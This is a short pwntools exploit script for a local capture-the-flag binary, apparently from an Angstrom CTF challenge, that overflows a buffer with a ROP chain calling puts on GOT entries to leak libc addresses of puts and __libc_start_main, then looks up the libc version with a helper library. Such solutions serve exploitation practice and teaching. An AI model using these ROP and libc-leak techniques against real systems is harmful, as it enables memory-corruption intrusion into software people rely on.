from pwn import *

import TheNight

import time

import sys

target = process("./chall-test_localID-angstrum-no-canary")
payload = ""
payload += "0000000000000000000000000000000000000000"
payload += p64(0x401343)
payload += p64(0x404018)
payload += p64(0x401030)
payload += p64(0x401343)
payload += p64(0x403fe8)
payload += p64(0x401030)
target.sendline(payload)
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
target.recvline()
leak = target.recvuntil("\n").strip("\n")
gotAddress0 = u64(leak + "\x00"*(8-len(leak)))
leak = target.recvuntil("\n").strip("\n")
gotAddress1 = u64(leak + "\x00"*(8-len(leak)))
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
